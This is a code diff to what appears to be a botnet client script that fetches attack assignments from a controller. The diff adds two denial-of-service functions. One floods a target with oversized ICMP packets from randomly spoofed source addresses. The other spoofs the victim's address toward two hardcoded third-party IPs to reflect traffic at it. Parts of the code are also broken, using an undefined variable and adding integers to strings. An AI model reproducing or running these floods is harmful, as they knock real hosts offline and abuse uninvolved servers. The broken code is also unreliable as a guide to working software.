@@ -16,6 +16,8 @@ import socket
 import random
 import os
 from time import sleep
+from scapy.all import *
+from scapy.layers.inet import IP, ICMP
 
 API_URL = ""
 UUID = ""
@@ -69,6 +71,37 @@ def ping(target, port, chunksize):
         sock.sendto(bytes,(target,port))
         print("Sent " + str(i) + " packets")
         i+=1
+def pod(target, port, chunksize):
+    addr = [192, 168, 100, 10]
+    d = "."
+    addr[0] = str(random.randrange(128,223))
+    addr[1] = str(random.randrange(0,255))
+    addr[2] = str(random.randrange(0,255))
+    addr[3] = str(random.randrange(2,254))
+    full_addr = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
+
+    print (full_addr)
+
+    while chunksize > 0:
+
+        ip_head =(IP(src = full_addr, dst = target))
+        package = ip_head/ICMP(dport = port)/('m'*66000)
+        send(package)
+        chunksize-=1
+
+def dns_amp(target, port, chunksize):
+    d = "."
+    print(full_addr)
+    dns1 = 156+d+154+d+70+d+29
+    dns2 = 216+d+38+d+105+d+6
+    while chunksize > 0:
+        ip_head = (IP(src=target, dst=dns1))
+        ip_head1 = IP(src = target, dst = dns2)
+        package = ip_head / ICMP(dport=port) / ('m' * 60000)
+        package1 = ip_head1 / ICMP(dport=port) / ('m' * 60000)
+        send(package)
+        send(package1)
+        chunksize -= 1
 
 
 def get_assignment():
